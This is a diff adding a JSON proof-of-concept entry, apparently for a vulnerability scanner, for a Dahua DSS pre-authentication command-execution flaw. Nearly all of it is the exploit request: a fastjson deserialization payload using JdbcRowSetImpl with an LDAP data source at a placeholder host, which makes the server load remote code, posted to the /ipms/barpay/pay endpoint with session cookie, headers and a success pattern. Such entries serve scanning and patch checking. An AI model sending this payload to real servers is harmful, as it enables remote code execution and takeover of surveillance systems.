@@ -1,0 +1,16 @@
+{
+  "name":"大华DSS前台命令执行漏洞",
+  "tag":"dahua",
+  "type":"exec",
+  "poc": {
+    "pocGet": "/ipms/barpay/pay",
+    "pocPost": "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://xxxxx/Basic/TomcatEcho\", \"autoCommit\": true}",
+    "header": {
+      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
+      "content-type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Linux;"
+    },
+    "status_code":"200",
+    "pattern": "(\"status\":200)"
+  }
+}
